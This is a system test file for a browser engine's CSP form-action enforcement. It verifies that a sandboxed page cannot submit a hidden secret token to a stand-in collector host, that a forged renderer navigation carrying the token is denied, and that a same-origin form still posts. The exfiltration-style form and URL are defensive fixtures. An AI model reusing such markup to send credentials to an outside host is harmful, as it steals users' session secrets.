"""
# @req: REQ-SECURITY-BROWSER-FORM-001


# codex-system-test
# @req REQ-WEB-BROWSER-012
# @manual: show
# @capture(html)
# @evidence-display: embed_tui
"""# Browser Form-Action Authorization

Proves that an authenticated HTTPS document cannot submit live form data past
its committed CSP form-action capability, while an authorized same-origin form
continues through the canonical browser request path. Rendering evidence stays
on WebIR -> DrawIrComposition -> Engine2D pixels.
"""
use std.spec.*
use std.gc_async_mut.web.browser_session.{BrowserSession, BrowserResponse}
use std.gc_async_mut.web.browser_session_runtime.*
use std.gc_async_mut.gpu.browser_engine.web_render_backend.{WebRenderBackend}
use common.ui.draw_ir.{DrawIrCommand, DrawIrComposition}
use std.common.web.browser_renderer_protocol.{BrowserRendererNetworkDecodeResult}
use os.hosted.hosted_browser_renderer_process.{HostedBrowserRendererProcess}
use test.system.browser_dom_identity_helpers.{
    system_browser_dom_identity_index
}

fn _form_action_command(
    composition: DrawIrComposition, component_id: text
) -> DrawIrCommand:
    for batch in composition.batches:
        for command in batch.commands:
            if command.component_id == component_id:
                return command
    fail("missing form-action Draw IR command: {component_id}")
    composition.batches[0].commands[0]

fn _form_action_pixel_oracle() -> [u32]:
    [
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32,
        0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32, 0xFF2563EBu32
    ]

fn _form_action_source_oracle() -> [text]:
    [
        "html_ast", "simple_web_html_layout_renderer", "html", "", "",
        "", "layout", "1"
    ]

use std.spec.step

describe "REQ-WEB-BROWSER-012: CSP form-action authorization":

    it "should keep form data and rendering inside the authorized origin":
        # @req: REQ-SECURITY-BROWSER-FORM-001
        step("Verify: should keep form data and rendering inside the authorized origin")
        step("Establish the authenticated navigation")
        var denied = BrowserSession.new()
        expect(denied.begin_network_navigation(
            "https://account.test/profile", "GET", "", "", ""
        ).is_ok()).to_be(true)
        val document_request = denied.take_pending_request().unwrap()
        expect(denied.commit_network_response(BrowserResponse.create(
            document_request.id, "document", document_request.url, 200,
            "Content-Security-Policy: sandbox allow-forms " +
            "allow-top-navigation allow-same-origin; form-action 'none'\n" +
            "Set-Cookie: session=authenticated; Secure; SameSite=Strict",
            "<html><head><style>html,body{margin:0;padding:0;width:8px;" +
            "height:4px}#authorized{display:block;width:8px;height:4px;" +
            "background-color:#2563eb;color:#2563eb}form{{display:none}}" +
            "</style></head><body id='surface'><main id='authorized'>" +
            "Authorized profile" +
            "</main><form id='profile' " +
            "action='https://collector.test/capture' method='post'>" +
            "<input id='secret' name='secret' value='token-123'>" +
            "<button id='send' type='submit'>Send</button></form>" +
            "</body></html>", ""
        )).is_ok()).to_be(true)
        expect(denied.current_url).to_equal("https://account.test/profile")
        expect(denied.document_cookie()).to_contain("session=authenticated")

        step("Apply origin and sandbox policy")
        expect(denied.content_security_policy).to_contain("form-action 'none'")
        expect(denied.csp_sandbox_policy.allow_forms).to_be(true)
        expect(denied.csp_sandbox_policy.allow_top_navigation).to_be(true)
        expect(denied.csp_sandbox_policy.allow_same_origin).to_be(true)
        val rendered_before = denied.render_html_document()
        val composition_before = WebRenderBackend.create(
            "pure_simple", 8, 4
        ).render_html_to_draw_ir(rendered_before)
        expect(composition_before.batches.len()).to_equal(1)  # oracle: 1 — pinned expected value for this behavior
        expect([
            composition_before.batches[0].source.source_kind,
            composition_before.batches[0].source.source_id,
            composition_before.batches[0].source.html_tag,
            composition_before.batches[0].source.html_node_id,
            composition_before.batches[0].source.css_selector,
            composition_before.batches[0].source.css_class,
            composition_before.batches[0].source.style_key,
            composition_before.batches[0].source.style_revision
        ]).to_equal(_form_action_source_oracle())
        val authorized_before = _form_action_command(
            composition_before, "authorized"
        )
        expect([
            authorized_before.kind, authorized_before.parent_id
        ]).to_equal(["rect", "surface"])
        expect([
            authorized_before.x, authorized_before.y,
            authorized_before.width, authorized_before.height
        ]).to_equal([0, 0, 8, 4])
        expect(authorized_before.color).to_equal(0xFF2563EBu32)  # oracle: 0xFF2563EBu32 — pinned expected value for this behavior
        expect(denied.render_to_pixels(8, 4).pixel_data).to_equal(
            _form_action_pixel_oracle()
        )

        step("Reject invalid transport or capability state")
        val denied_dispatch = denied.dispatch_dom_keyboard_event(
            "secret", "Enter", true
        ).unwrap()
        val denied_identity_index = system_browser_dom_identity_index(denied)
        expect(denied_dispatch.default_action).to_equal("button-activate")
        expect(denied_identity_index.author_id_for_route(
            denied_dispatch.target_route
        ) ?? "").to_equal("send")
        expect(denied.pending_request_count()).to_equal(0)  # oracle: 0 — pinned expected value for this behavior
        expect(denied.take_pending_request()).to_be_nil()
        expect(denied.warnings.join("|")).to_contain(
            "CSP blocked form submission: https://collector.test/capture"
        )

        var allowed = BrowserSession.new()
        expect(allowed.begin_network_navigation(
            "https://account.test/edit", "GET", "", "", ""
        ).is_ok()).to_be(true)
        val allowed_document = allowed.take_pending_request().unwrap()
        expect(allowed.commit_network_response(BrowserResponse.create(
            allowed_document.id, "document", allowed_document.url, 200,
            "Content-Security-Policy: default-src 'none'; " +
            "sandbox allow-forms allow-top-navigation; form-action 'self'",
            "<html><body><form id='edit' action='/save' method='post'>" +
            "<input name='name' value='Ada'><button id='save' " +
            "type='submit'>Save</button></form></body></html>", ""
        )).is_ok()).to_be(true)
        val allowed_dispatch = allowed.dispatch_dom_event(
            "save", "click", true, true
        )
        val allowed_identity_index = system_browser_dom_identity_index(allowed)
        expect(allowed_identity_index.author_id_for_route(
            allowed_dispatch.target_route
        ) ?? "").to_equal("save")
        expect(allowed_dispatch.default_action).to_equal("button-activate")
        val allowed_request = allowed.take_pending_request().unwrap()
        expect(allowed_request.url).to_equal("https://account.test/save")
        expect(allowed_request.method).to_equal("POST")
        expect(allowed_request.body).to_equal("name=Ada")

        step("Render only the authorized document")
        expect(denied.current_url).to_equal("https://account.test/profile")
        expect(denied.current_body_html).to_contain("Authorized profile")
        val composition_after = WebRenderBackend.create(
            "pure_simple", 8, 4
        ).render_html_to_draw_ir(denied.render_html_document())
        expect(composition_after.batches.len()).to_equal(1)  # oracle: 1 — pinned expected value for this behavior
        expect([
            composition_after.batches[0].source.source_kind,
            composition_after.batches[0].source.source_id,
            composition_after.batches[0].source.html_tag,
            composition_after.batches[0].source.html_node_id,
            composition_after.batches[0].source.css_selector,
            composition_after.batches[0].source.css_class,
            composition_after.batches[0].source.style_key,
            composition_after.batches[0].source.style_revision
        ]).to_equal(_form_action_source_oracle())
        val authorized_after = _form_action_command(
            composition_after, "authorized"
        )
        expect([
            authorized_after.kind, authorized_after.parent_id
        ]).to_equal(["rect", "surface"])
        expect([
            authorized_after.x, authorized_after.y,
            authorized_after.width, authorized_after.height
        ]).to_equal([0, 0, 8, 4])
        expect(authorized_after.color).to_equal(0xFF2563EBu32)  # oracle: 0xFF2563EBu32 — pinned expected value for this behavior
        expect(denied.render_to_pixels(8, 4).pixel_data).to_equal(
            _form_action_pixel_oracle()
        )

    it "should make hosted renderer document navigation inherit form-action":
        # @req: REQ-SECURITY-BROWSER-FORM-001
        step("Verify: should make hosted renderer document navigation inherit form-action")
        step("Bind the parent-owned policy to a renderer navigation")
        var broker = HostedBrowserRendererProcess.create(12, 8, 4)
        broker.document_url = "https://account.test/profile"
        broker.document_origin = "https://account.test"
        broker.document_csp_policy = "form-action 'self'"
        broker.document_csp_ready = true
        expect(broker.authorize_renderer_navigation(
            BrowserRendererNetworkDecodeResult(
                ok: true, reason: "ok", reply_to_request_id: 1,
                request_id: "form-save", kind: "document",
                url: "https://account.test/save", method: "POST",
                headers: "", body: "name=Ada",
                content_type: "application/x-www-form-urlencoded",
                credentials: "include", script_cookie_writes: [], status: 0,
                error: "", initiator_origin: "https://account.test"
            )
        )).to_be(true)
        expect(broker.navigation_permit.form_action_policy).to_equal(
            "form-action 'self'"
        )
        expect(broker.navigation_permit.form_action_document_url).to_equal(
            "https://account.test/profile"
        )

        step("Deny an untrusted renderer target before it becomes a permit")
        broker.navigation_permit.active = false
        broker.document_csp_policy = "form-action 'none'"
        expect(broker.authorize_renderer_navigation(
            BrowserRendererNetworkDecodeResult(
                ok: true, reason: "ok", reply_to_request_id: 2,
                request_id: "forged-get", kind: "document",
                url: "https://collector.test/capture?secret=token",
                method: "GET", headers: "", body: "", content_type: "",
                credentials: "include", script_cookie_writes: [], status: 0,
                error: "", initiator_origin: "https://account.test"
            )
        )).to_be(false)
        expect(broker.navigation_permit.active).to_be(false)
